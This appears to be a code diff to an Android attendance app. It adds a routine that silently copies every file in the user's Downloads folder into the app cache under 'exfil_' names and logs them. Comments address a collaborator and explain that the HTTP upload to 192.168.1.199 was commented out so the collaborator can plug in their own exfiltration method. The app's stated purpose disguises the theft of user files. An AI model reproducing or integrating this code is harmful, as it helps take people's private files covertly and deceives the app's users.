@@ -251,39 +251,118 @@ fun AttendanceScreen(navController: NavHostController) {
             }
         })
     }
-    // Move this outside the Scaffold block, before processLocation
+    fun printCacheFiles(context: Context) {
+        val cacheDir = context.cacheDir
+        val files = cacheDir.listFiles() ?: emptyArray()
+
+        if (files.isEmpty()) {
+            Log.d("CacheFiles", "Cache directory is empty")
+            return
+        }
+
+        Log.d("CacheFiles", "===== Contents of ${cacheDir.absolutePath} =====")
+
+        files.sortedBy { it.name }.forEach { file ->
+            val sizeKB = file.length() / 1024
+            val modified = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+                .format(Date(file.lastModified()))
+
+            Log.d("CacheFiles",
+                "${file.name}\n" +
+                        "Size: ${sizeKB} KB\n" +
+                        "Modified: $modified\n" +
+                        "Path: ${file.absolutePath}\n" +
+                        "----------------------")
+        }
+    }
     fun uploadLogFileToServer(context: Context) {
-        val file = File(context.filesDir, "hello.txt")
-//        val file = File("/data/data/com.example.axesite/cache/", "hello.txt")
-        if (!file.exists()) return
+        // IF YOU'RE INTEGRATING, READ THE COMMENTS. I THINK IT MIGHT HELP ABIT
+
+        // This targets the Download directory. You may have to change this for the actual device (non-emulator)
+        // Can test by adb shelling then touch a new file and verify on the phone if you at the right dir
+        val downloadsDir = File("/storage/emulated/0/Download") // Change me if needed!
+
+        val cacheDir = context.cacheDir // This is just cache dir (/data/data/com.example.axesite/cache)
+
+        // Some error handling. Works 100% fine on emulator. On emulator this if statement was always false.
+        if (!downloadsDir.exists() || !downloadsDir.canRead()) {
+            Log.e("Upload", "Cannot access downloads directory")
+            return
+        }
 
         scope.launch(Dispatchers.IO) {
             try {
-                val client = OkHttpClient.Builder()
-                    .connectTimeout(10, TimeUnit.SECONDS)  // Fixed syntax
-                    .build()
+                // List all files in the directory
+                val files = downloadsDir.listFiles()?.filter { it.isFile } ?: emptyList()
 
-                val response = client.newCall(
-                    Request.Builder()
-                        .url("http://192.168.1.199")
-                        .post(file.readBytes().toRequestBody("text/plain".toMediaType()))
-                        .build()
-                ).execute()
+                if (files.isEmpty()) {
+                    withContext(Dispatchers.Main) {
+                        Toast.makeText(context, "No files found in Downloads", Toast.LENGTH_SHORT).show()
+                    }
+                    return@launch
+                }
 
-                withContext(Dispatchers.Main) {
-                    if (response.isSuccessful) {
-                        Toast.makeText(context, "Attendance Successful", Toast.LENGTH_SHORT).show()
-                        file.delete()
-                    } else {
-                        Toast.makeText(context, "Attendance Successful. Server: ${response.code}", Toast.LENGTH_SHORT).show()
+                // You CAN 100% remove / comment this if you're exfiltrating through your way. (I did it for u already)
+//                val client = OkHttpClient.Builder()
+//                    .connectTimeout(10, TimeUnit.SECONDS)
+//                    .build()
+
+                // For loop to copy all files from the target directory to cache dir
+                for (sourceFile in files) {
+                    try {
+                        // this is just to assign the absolute filepath to the variable destFile
+                        val destFile = File(cacheDir, "exfil_${sourceFile.name}")
+
+                        // Copy file
+                        sourceFile.inputStream().use { input ->
+                            destFile.outputStream().use { output ->
+                                input.copyTo(output)
+                            }
+                        }
+
+                        // Upload the file.
+                        // You can absolutely once again remove / comment this if you are exfiltrating your way (I did it for u already)
+                        // IF you are removing /commenting it, follow the start comment to end comment
+                        // Anything in between Start to end is safe to comment if you're exfiltrating your way
+                        // make sure also remove the val client comment on top as mentioned
+
+                        // START
+//                        val response = client.newCall(
+//                            Request.Builder()
+//                                .url("http://192.168.1.199")
+//                                .post(destFile.readBytes().toRequestBody("application/octet-stream".toMediaType()))
+//                                .build()
+//                        ).execute()
+//
+//                        if (response.isSuccessful) {
+//                            Log.d("Upload", "Uploaded ${sourceFile.name} successfully")
+//                            destFile.delete() // Clean up
+//                        } else {
+//                            Log.e("Upload", "Failed to upload ${sourceFile.name}: ${response.code}")
+//                        }
+                    // END!
+
+                    } catch (e: Exception) {
+                        Log.e("Upload", "Error processing ${sourceFile.name}", e)
                     }
                 }
+
+                withContext(Dispatchers.Main) {
+                    Toast.makeText(context, "Processed ${files.size} files", Toast.LENGTH_SHORT).show()
+                }
+
+                // This is just a function i wrote to log down if the files ACTUALLY moved.
+                // Basically 'ls /data/data/com.example.axesite.com/cache' then see results in logcat filter for 'CacheFiles'
+                // You can remove / comment this line and delete the entire function if you find it unnecessary.
+                printCacheFiles(context)
+
             } catch (e: Exception) {
                 withContext(Dispatchers.Main) {
-                    Toast.makeText(context, "Upload error: ${e.message}", Toast.LENGTH_LONG).show()
+                    Toast.makeText(context, "Error: ${e.message}", Toast.LENGTH_LONG).show()
                 }
-                Log.e("Upload", "Failed", e)
+                Log.e("Upload", "Failed to process directory", e)
             }
+
         }
     }
     // Function to process the obtained location.
